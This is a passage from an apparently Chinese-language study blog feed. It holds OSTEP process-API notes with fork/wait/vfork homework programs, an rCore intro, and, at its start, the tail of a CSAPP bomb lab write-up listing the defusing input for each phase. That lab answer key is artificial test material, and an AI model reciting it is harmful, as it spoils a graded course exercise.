class="hljs-number">32</span><br><span class="hljs-attribute">That</span>&#x27;s number <span class="hljs-number">2</span>.  Keep going!<br><span class="hljs-attribute">1</span> <span class="hljs-number">332</span><br><span class="hljs-attribute">Halfway</span> there!<br><span class="hljs-attribute">14</span> <span class="hljs-number">45</span> DrEvil<br><span class="hljs-attribute">So</span> you got that one.  Try this one.<br><span class="hljs-attribute">5</span> <span class="hljs-number">115</span><br><span class="hljs-attribute">Good</span> work!  <span class="hljs-literal">On</span> to the next...<br><span class="hljs-attribute">2</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">Curses</span>, you&#x27;ve found the secret phase!<br><span class="hljs-attribute">But</span> finding it and solving it are quite different...<br><br><span class="hljs-attribute">22</span><br><span class="hljs-attribute">Wow</span>! You&#x27;ve defused the secret stage!<br><span class="hljs-attribute">Congratulations</span>! You&#x27;ve defused the bomb!<br><br></code></pre></td></tr></table></figure><p><strong>实验至此结束</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>rCore</title>
    <link href="/2023/04/08/rCore/"/>
    <url>/2023/04/08/rCore/</url>
    
    <content type="html"><![CDATA[<h1 id="rCore实验记录"><a href="#rCore实验记录" class="headerlink" title="rCore实验记录"></a>rCore实验记录</h1><p>实验指导书：</p><p><a href="http://rcore-os.cn/rCore-Tutorial-Book-v3/chapter1/0intro.html">http://rcore-os.cn/rCore-Tutorial-Book-v3/chapter1/0intro.html</a></p><p>第零章配置环境等略去，指导书中有详细指导。</p><h1 id="第一章-应用程序与基本执行环境"><a href="#第一章-应用程序与基本执行环境" class="headerlink" title="第一章 应用程序与基本执行环境"></a>第一章 应用程序与基本执行环境</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本章展现了操作系统的一个基本目标：让应用与硬件隔离，简化了应用访问硬件的难度和复杂性。</p><p>程序员初学编程之时，往往是通过一行 “hello world” 打开新世界大门，短短几行 C 代码，简单的编译语句，再使用<code>./</code>执行之，就能输出。这是操作系统、硬件等一系列复杂支持所提供的开发环境。</p><p>本章主要是讲解如何设计和实现建立在裸机上的执行环境，并让应用程序能够在这样的执行环境中运行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Operating Systems</title>
    <link href="/2023/03/23/Operating-Systems/"/>
    <url>/2023/03/23/Operating-Systems/</url>
    
    <content type="html"><![CDATA[<h1 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h1><h1 id="第一章-关于本书的对话"><a href="#第一章-关于本书的对话" class="headerlink" title="第一章 关于本书的对话"></a>第一章 关于本书的对话</h1><p>关于 <strong>Three Easy Pieces</strong> 指的是 **虚拟化(virtualization), 并发(concurrency), 持久性(persistence)**这是我们要学习的三个重要概念。</p><h1 id="第二章-操作系统介绍"><a href="#第二章-操作系统介绍" class="headerlink" title="第二章 操作系统介绍"></a>第二章 操作系统介绍</h1><p>有一类软件负责让程序运行变得更加容易，允许你同时运行多个程序，允许程序共享内存，让程序能与设备进行交互，以及其他类似有趣的工作。这些软件称为 <strong>操作系统(Operating System，OS)</strong> 。</p><h1 id="第三章-关于虚拟化的对话"><a href="#第三章-关于虚拟化的对话" class="headerlink" title="第三章 关于虚拟化的对话"></a>第三章 关于虚拟化的对话</h1><p>虚拟化：给一群人一共一个桃子，但让每个人认为，他独占这个桃子。</p><h1 id="第四章-抽象：进程"><a href="#第四章-抽象：进程" class="headerlink" title="第四章 抽象：进程"></a>第四章 抽象：进程</h1><p>进程：运行中的程序。<br>时分共享CPU（time sharing）：让一个进程只允许一个时间片，然后切换到其他进程。</p><h2 id="进程-API"><a href="#进程-API" class="headerlink" title="进程 API"></a>进程 API</h2><p>所有现代操作系统都以某种形式提供这些 API</p><ul><li><strong>创建（create）</strong>：操作系统包含一些创建新进程的方法。</li><li><strong>销毁（destroy）</strong>：销毁进程的接口。</li><li><strong>等待（wait）</strong>：等待进程停止运行。</li><li><strong>其他控制（miscellaneous control）</strong>：例如暂停、恢复等操作。</li><li><strong>状态（statu）</strong>：获取进制的状态信息。</li></ul><h2 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h2><p>首先，将程序（代码、静态数据）加载（load）到内存中，加载到进程的地址空间中。<br><img src="/2023/03/23/Operating-Systems/p1.png"></p><p>现代操作系统是懒加载（lazily load），即仅在程序执行期间需要的代码或数据片段，才会加载。</p><p>加载了代码与静态数据到内存后，操作系统需要为程序的运行时栈分配一些内存。<br>再为堆也分配一些内存。并执行一些与I/O相关的工作。</p><p>当OS终于为程序执行搭好了舞台，他还有最后一项任务：启动程序。在入口处运行，即 main()。通过跳转到 main()例程，OS 将 CPU 的控制权转移到新创建的进程中。</p><h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><p>进程可以处于以下三种状态之一：</p><ul><li><strong>运行（running）</strong>：运行状态下，进程在处理器上运行。</li><li><strong>就绪（ready）</strong>：程序准备好运行。</li><li><strong>阻塞（blocked）</strong>：阻塞状态下，一个进程执行了某种操作，直到其他事件发生才会准备运行。例如一个进程向磁盘发起 I/O 请求，它会被阻塞，其他进程可以使用处理器。</li></ul><p><img src="/2023/03/23/Operating-Systems/p2.png"></p><h1 id="第五章-插叙：进程-API"><a href="#第五章-插叙：进程-API" class="headerlink" title="第五章 插叙：进程 API"></a>第五章 插叙：进程 API</h1><h2 id="fork-系统调用"><a href="#fork-系统调用" class="headerlink" title="fork()系统调用"></a>fork()系统调用</h2><p>系统调用 fork()用于创建新进程。</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>    <span class="hljs-type">int</span>  <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br> &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="hljs-type">int</span>) getpid());<br>     <span class="hljs-type">int</span> rc = fork();<br>     <span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// fork failed; exit</span><br>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br> &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rc == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// child (new process)</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am child (pid:%d)\n&quot;</span>, (<span class="hljs-type">int</span>) getpid());<br> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// parent goes down this path (main)</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am parent of %d (pid:%d)\n&quot;</span>,<br>     rc, (<span class="hljs-type">int</span>) getpid()); <br> &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125; <br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">prompt</span>&gt; ./<span class="hljs-selector-tag">p1</span><br><span class="hljs-selector-tag">hello</span> <span class="hljs-selector-tag">world</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29146</span>)<br><span class="hljs-selector-tag">hello</span>, <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">am</span> <span class="hljs-selector-tag">parent</span> <span class="hljs-selector-tag">of</span> <span class="hljs-number">29147</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29146</span>)<br><span class="hljs-selector-tag">hello</span>, <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">am</span> <span class="hljs-selector-tag">child</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29147</span>)<br><span class="hljs-selector-tag">prompt</span>&gt; <br></code></pre></td></tr></table></figure><p>fork()出的子进程不会从 main()函数开始执行（因此hello world 信息只输出了一次），而是直接从 fork()系统调用返回。就好像它自己调用了 fork()。<br>子进程并不是完全拷贝了父进程。具体来说，虽然它拥有自己的地址空间、寄存器、程序计数器等，但它从 fork() 返回的值是不同的。父进程获得的 fork() 返回值是子进程的 pid ， 而子进程获得的返回值是 0 。这个差别很重要。<br>且父、子进程输出是不确定的，即有可能父进程先运行，也有可能子进程先运行。<br>CPU 调度程序（scheduler） 决定了某个时刻哪个进程被执行。</p><h2 id="wait-系统调用"><a href="#wait-系统调用" class="headerlink" title="wait() 系统调用"></a>wait() 系统调用</h2><p>当父进程调用 wait() 于某处时，若父进程碰巧被先执行，也会延迟执行，等到子进程执行完毕，wait() 才返回父进程。</p><h2 id="exec-系统调用"><a href="#exec-系统调用" class="headerlink" title="exec() 系统调用"></a>exec() 系统调用</h2><p>exec() 给定可执行程序的名称及需要的参数后，exec() 会从可执行程序中加载代码和静态数据，并用它覆写自己的代码段，堆、栈及其他内存空间也会被重新初始化。子进程执行exec()之后，几乎就像 p3.c 未曾运行过一样，即对 exec() 的成功调用<strong>永远不会返回</strong></p><p>如下例中，子进程调用 exec() 后，exec调用的程序执行完以后，子进程内未进行的代码段不会进行，而是直接去进行排队等待的父进程去了。</p><p><img src="/2023/03/23/Operating-Systems/p3.png"></p><p>关于管道：pipe() 系统调用。这种情况下，一个进程的输出被链接到了一个内核管道(pipe)上(队列), 另一个进程的输入也被链接到同一个管道上。因此，前一个进程的输出可以无缝地作为后一个进程的输入，许多命令可以用这种方式串联起来，完成某项任务。（23.03.23更）</p><h2 id="第五章课后习题"><a href="#第五章课后习题" class="headerlink" title="第五章课后习题"></a>第五章课后习题</h2><p>1.编写一个调用 fork()的程序。在调用 fork()之前，让主进程访问一个变量（例如 x） 并将其值设置为某个值（例如 100）。子进程中的变量有什么值？当子进程和父进程都改变 x 的值时，变量会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> x = <span class="hljs-number">100</span>;<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am Child (pid : %d)\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>                x += <span class="hljs-number">1</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x has been changed to = %d \n&quot;</span>,x);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am Parent of %d (pid : %d)\n&quot;</span>,rc,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>                x += <span class="hljs-number">10</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x has been changed to = %d \n&quot;</span>,x);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">kawa@kawa-virtual-machine:~/Desktop$ ./h1<br>hello world ( pid : 3990 )<br>hello, I am Parent of 3991 (pid : 3990)<br>The value x = 100 <br>The value x has been changed to = 110 <br>The value x = 110 <br>hello, I am Child (pid : 3991)<br>The value x = 100 <br>The value x has been changed to = 101 <br>The value x = 101 <br><br></code></pre></td></tr></table></figure><p>可见，父、子进程中，x 初始值均为 100，因为 fork() 时，是复制的当时的程序数据，给到子进程，所以 x 初值均为 100 。</p><p>3.使用 fork()编写另一个程序。子进程应打印“hello”，父进程应打印“goodbye”。你应该尝试确保子进程始终先打印。你能否不在父进程调用 wait()而做到这一点呢？</p><p>使用vfork() 实现这一点：</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = vfork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goodbye!\n&quot;</span>);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript">kawa<span class="hljs-meta">@kawa</span>-virtual-<span class="hljs-attr">machine</span>:~<span class="hljs-regexp">/Desktop$ ./</span>h3<br>hello world ( pid : <span class="hljs-number">5321</span> )<br>hello<br>goodbye!<br></code></pre></td></tr></table></figure><p>可见，vfork() 成功完成了其使命。</p><p>5.现在编写一个程序，在父进程中使用 wait()，等待子进程完成。wait()返回什么？如果你在子进程中使用 wait()会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is Child pid = %d \n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is parent pid = %d \n&quot;</span> ,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-type">int</span> w = wait();<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the return value of wait() is : %d \n&quot;</span>,w);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp">kawa@kawa-<span class="hljs-keyword">virtual</span>-machine:~/Desktop$ ./<span class="hljs-function">h5</span><br><span class="hljs-function">hello <span class="hljs-title">world</span> (<span class="hljs-params"> pid : <span class="hljs-number">5479</span> </span>)</span><br><span class="hljs-function">This <span class="hljs-keyword">is</span> parent pid</span> = <span class="hljs-number">5479</span> <br>This <span class="hljs-keyword">is</span> Child pid = <span class="hljs-number">5480</span> <br><span class="hljs-function">the <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> of <span class="hljs-title">wait</span>() <span class="hljs-keyword">is</span> : 5480</span><br></code></pre></td></tr></table></figure><p>显然，wait() 返回值为 子进程的pid。</p><p>当子进程wait时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is Child pid = %d \n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-type">int</span> w = wait();<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the return value of wait() is : %d \n&quot;</span>,w);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is parent pid = %d \n&quot;</span> ,(<span class="hljs-type">int</span>) getpid());<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">kawa@kawa-<span class="hljs-keyword">virtual</span>-machine:~/Desktop$ ./<span class="hljs-function">h5</span><br><span class="hljs-function">hello <span class="hljs-title">world</span> (<span class="hljs-params"> pid : <span class="hljs-number">5569</span> </span>)</span><br><span class="hljs-function">This <span class="hljs-keyword">is</span> parent pid</span> = <span class="hljs-number">5569</span> <br>This <span class="hljs-keyword">is</span> Child pid = <span class="hljs-number">5570</span> <br><span class="hljs-function">the <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> of <span class="hljs-title">wait</span>() <span class="hljs-keyword">is</span> : -1 </span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>可见，子进程中调用 wait，返回值为 -1。</p><p>因为wait() 返回值为成功结束的子进程，而子进程中无法收集到更下一级的子进程pid（因为不存在），就会导致回收失败，返回值为-1。</p><p>7.编写一个创建子进程的程序，然后在子进程中关闭标准输出（STDOUT_FILENO）。 如果子进程在关闭描述符后调用 printf()打印输出，会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> rc = fork();<br><span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rc == <span class="hljs-number">0</span>) &#123;<br>close(STDOUT_FILENO);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;output child\n&quot;</span>);<br>&#125;<br>wait(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>无。</p><p>没有输出。</p><p>习题到此为止。</p><h1 id="第六章-机制：受限直接执行"><a href="#第六章-机制：受限直接执行" class="headerlink" title="第六章 机制：受限直接执行"></a>第六章 机制：受限直接执行</h1><p>以下是直接运行协议：</p><p><img src="/2023/03/23/Operating-Systems/p4.png"></p><p>其过程大致是：在操作系统上进行一系列准备操作（进程列表上创建条目、分配内存、加载、设置栈等等），如何程序执行交还程序本身，进行执行，最后由操作系统收尾（清除内存等）。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>引入一种新的处理器模式：用户模式（user mode）；</p><p>在用户模式下，进程会受到限制，例如不能发出I/O请求。</p><p>与用户模式不同的内核模式（kernel mode），操作系统（或内核）就以这种模式运行。 在此模式下，运行的代码可以做它喜欢的事，包括特权操作。</p><p>内核通过在启动时设置陷阱表（trap table）来实现。当机器启动时，它在特权（内核）模 式下执行，因此可以根据需要自由配置机器硬件。操作系统做的第一件事，就是告诉硬件在发生某些异常事件时要运行哪些代码。</p><h2 id="进程间切换"><a href="#进程间切换" class="headerlink" title="进程间切换"></a>进程间切换</h2><p><strong>时钟中断（timer interrupt）</strong></p><p>时钟设备可以编程为每隔几毫秒产生一次中断。产生中断时，当前正在运行的进 程停止，操作系统中预先配置的<strong>中断处理程序（interrupt handler）</strong>会运行。此时，操作系统 重新获得 CPU 的控制权，因此可以做它想做的事：停止当前进程，并启动另一个进程。</p><p>是继续运行当前正在运行的进程，还是切换到另一个进程。这 个决定是由<strong>调度程序（scheduler）</strong>做出的，它是操作系统的一部分。</p><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><p>操作系统要做的就是为当前正在执行的进程保存一些寄存器 的值（例如，到它的内核栈），并为即将执行的进程恢复一些寄存器的值（从它的内核栈）。</p><p>为了保存当前正在运行的进程的上下文，操作系统会执行一些底层汇编代码，来保存 通用寄存器、程序计数器，以及当前正在运行的进程的内核栈指针，然后恢复寄存器、程 序计数器，并切换内核栈，供即将运行的进程使用。</p><p><img src="/2023/03/23/Operating-Systems/p5.png"></p><h1 id="第七章-进程调度：介绍"><a href="#第七章-进程调度：介绍" class="headerlink" title="第七章 进程调度：介绍"></a>第七章 进程调度：介绍</h1><p><strong>调度策略（sheculing policy）</strong></p><p><strong>T 周转时间= T 完成时间−T 到达时间</strong></p><p><strong>FIFO先进先出</strong></p><p>A 先运行 100s，B 或 C 才有机会运行。因此，系统的平均周转时间是比 较高的：令人不快的 110s（（100 + 110 + 120）/ 3 = 110）。<strong>护航效应（convoy effect）</strong></p><h3 id="最短任务优先（SJF）"><a href="#最短任务优先（SJF）" class="headerlink" title="最短任务优先（SJF）"></a>最短任务优先（SJF）</h3><p>这个新的调度准则被称为最短任 务优先（Shortest Job First，SJF），该名称应该很容易记住，因为它完全描述了这个策略： 先运行最短的任务，然后是次短的任务，如此下去。</p><h3 id="最短完成时间优先（STCF）"><a href="#最短完成时间优先（STCF）" class="headerlink" title="最短完成时间优先（STCF）"></a>最短完成时间优先（STCF）</h3><p>当 B 和 C 